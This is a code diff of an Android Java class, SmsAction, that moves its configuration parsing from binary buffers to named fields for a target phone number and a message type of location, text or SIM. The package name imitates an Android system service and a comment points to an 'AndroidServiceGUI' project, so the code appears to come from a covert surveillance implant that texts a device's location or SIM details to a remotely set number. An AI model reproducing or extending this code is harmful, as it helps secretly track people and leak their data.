@@ -11,12 +11,18 @@ package com.android.service.action;
 
 import java.io.IOException;
 
+import org.json.JSONObject;
+
 import android.telephony.SmsManager;
 
 import com.android.service.CellInfo;
 import com.android.service.Device;
 import com.android.service.Messages;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
+import com.android.service.conf.ConfigurationException;
+import com.android.service.event.BaseEvent;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.Utils;
@@ -49,16 +55,16 @@ public class SmsAction extends SubAction {
 	/** The type. */
 	int type;
 
+	private String descrType;
+
 	/**
 	 * Instantiates a new sms action.
 	 * 
-	 * @param type2
-	 *            the type
-	 * @param confParams
+	 * @param params
 	 *            the conf params
 	 */
-	public SmsAction(final int type2, final byte[] confParams) {
-		super(type2, confParams);
+	public SmsAction(final ConfAction params) {
+		super( params);
 
 		sm = SmsManager.getDefault();
 	}
@@ -69,7 +75,7 @@ public class SmsAction extends SubAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 
 		try {
 			switch (type) {
@@ -166,27 +172,31 @@ public class SmsAction extends SubAction {
 	 * @return true, if successful
 	 */
 	@Override
-	protected boolean parse(final byte[] confParams) {
-		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
-
+	protected boolean parse(final ConfAction params) {
 		try {
-			type = databuffer.readInt();
-			if (Cfg.DEBUG) {
-				Check.asserts(type >= 1 && type <= 3, "wrong type"); //$NON-NLS-1$
+			
+			number = Utils.unspace( params.getString("number"));
+			descrType = params.getString("type");
+			
+			if("location".equals(descrType)){
+				type=TYPE_LOCATION;
+			}else if("text".equals(descrType)){
+				type=TYPE_TEXT;				
+			}else if("sim".equals(descrType)){
+				type=TYPE_SIM;
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse) Error, unknown type: " + descrType);
+				}
+				return false;
 			}
-			int len = databuffer.readInt();
-			byte[] buffer = new byte[len];
-			databuffer.read(buffer);
-			number = Utils.unspace(WChar.getString(buffer, true));
 
 			switch (type) {
 			case TYPE_TEXT:
 				// TODO controllare che la lunghezza non sia superiore a 70
 				// caratteri
-				len = databuffer.readInt();
-				buffer = new byte[len];
-				databuffer.read(buffer);
-				text = WChar.getString(buffer, true);
+				
+				text = params.getString("text");
 				break;
 
 			case TYPE_LOCATION:
@@ -219,7 +229,10 @@ public class SmsAction extends SubAction {
 				
 				break;
 			}
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (parse) Error: " + e);
+			}
 			return false;
 		}
 
